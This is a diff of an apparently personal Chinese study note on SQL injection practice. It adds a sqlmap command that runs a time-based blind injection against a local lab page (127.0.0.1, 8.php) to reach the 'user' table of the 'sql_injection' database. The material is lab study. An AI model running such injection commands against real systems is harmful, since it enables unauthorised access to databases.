@@ -197,16 +197,19 @@ AND ORD
  - [ ] 对于无论如何都显示相同信息的，怎么办呢？
 
 如8.php：
-
+![输入图片说明](/imgs/2023-05-11/XaApmBcsUXqmvKRE.png)
 
 ```
-这里输入代码
+/sqlmap.py -u 
+'http://127.0.0.1/sql_injection/8.php?id=1&submit=submit' 
+-p id --technique=T --fresh-queries -D sql_injection 
+-T user --current-db
 ```
 
 > Written with [StackEdit中文版](https://stackedit.cn/).
 >
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNDMyNDkzMjEzLDkwMTYwMzczOCwtMTMzNj
+eyJoaXN0b3J5IjpbNjM5Mzk5ODQ0LDkwMTYwMzczOCwtMTMzNj
 Y2MzUxNSwxNjAyNjQ3MTA4LDIwMzc2MDk3MDIsMTA3NTMzNzY5
 LDE3NjkzMjY5ODEsMjAyMDEzMDAyOCwyNjQ2NDE2MDMsMjEyOD
 U3MzE2OCwtNjYxMTk0ODc2LC0yMjAxMjYxNjAsLTg5Nzk2NzY3
